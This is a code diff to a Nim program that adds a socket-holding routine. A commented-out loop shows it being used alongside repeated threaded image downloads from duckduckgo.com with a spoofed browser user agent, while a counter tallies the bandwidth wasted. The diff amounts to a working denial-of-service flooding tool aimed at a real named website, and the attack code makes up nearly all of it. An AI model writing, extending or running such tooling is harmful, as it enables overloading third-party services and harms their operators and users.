@@ -1,4 +1,4 @@
-import asynchttpserver, strutils, httpclient, threadpool, json
+import asynchttpserver, strutils, httpclient, threadpool, json, asyncdispatch, net
 
 proc imgGrb(conType: string, target: string, targetImg: string, userAgent: string, range: int32, referer: string, timeout = 1200, log = false): bool =
   let client = newHttpClient(timeout = timeout)
@@ -43,14 +43,27 @@ proc imgGrb(conType: string, target: string, targetImg: string, userAgent: strin
       echo "An error occurred: ", e.msg
     return false
 
+proc sessionGrb(target: string, port: int32, range: int64, timeout = 1000, log = false) {.async.} =
+  var socket = newSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+  try:
+    socket.connect(target, Port(port))
+    if log == true:
+      echo "Connected to ", target, ":", port
+    await sleepAsync(timeout)
+  except:
+    discard
+
 #[
 var
   bitRange: int32 = 290235
   bitWast = 0
   target = "duckduckgo.com"
+  port: int32 = 443
+  range: int64 = 100
   targetImg = "/static-assets/image/pages/home/devices/how-it-works/desktop/search-protection-back-dark.png"
 
 while true:
+  discard spawn sessionGrb(target, port, range, log = true)
   var outPass = spawn imgGrb("https://", target, targetImg, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0", bitRange, "https://duckduckgo.com/")
   if ^outPass == true:
     bitWast += bitRange
